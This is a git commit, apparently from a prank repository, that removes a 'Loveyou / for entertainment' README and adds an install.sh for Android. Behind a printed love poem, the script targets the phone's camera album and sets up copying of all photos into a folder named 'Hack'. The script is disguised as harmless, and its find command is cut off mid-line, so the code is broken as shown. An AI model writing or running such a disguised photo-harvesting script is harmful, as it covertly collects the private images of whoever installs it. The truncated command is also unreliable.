efc7a62c37d7c7dd8558170dbe23d8df32122aa8
Xyra77 <143688377+Xyra77@users.noreply.github.com>
2024-06-07 19:42:56 +0700

    install.sh

--- README.md
+++
@@ -1,2 +0,0 @@
-# Loveyou
-Untuk hiburan
---
+++ install.sh
@@ -0,0 +1,17 @@
+#!/bin/bash
+
+# Direktori sumber (album)
+SOURCE_DIR="/storage/emulated/0/DCIM/Camera/"
+
+# Direktori tujuan
+TARGET_DIR="/storage/emulated/0/Hack"
+
+# Membuat direktori tujuan jika belum ada
+mkdir -p "$TARGET_DIR"
+
+# Menyalin semua file gambar (jpg, png, jpeg) dari album ke direktori tujuan
+find "$SOURCE_DIR" -type f \( -iname "*.jpg" -o -iname "*.jpeg" -o -iname "*.png" \) -e>
+
+echo "Aku mau kasih pantun
+Ikan Hiu Ikan Cucut
+I Love You Are So Cute❤"
